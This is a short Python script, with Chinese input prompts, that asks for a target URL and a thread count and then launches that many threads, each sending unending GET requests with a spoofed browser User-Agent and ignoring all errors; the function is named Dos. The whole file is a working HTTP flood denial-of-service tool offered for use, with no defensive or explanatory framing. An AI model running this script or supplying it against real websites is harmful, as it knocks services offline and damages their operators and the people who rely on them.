import threading
import requests

def Dos(url:str)->None:
    header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0"}
    while True:
        try:
            response = requests.get(url,headers=header)
            # print("Code:%s"%response.status_code)
        except:
            pass

if __name__ == '__main__':
    url = input("输入网址:")
    payload = int(input("线程量:"))
    for i in range(payload):
        threading.Thread(target=Dos,args=(url,)).start()

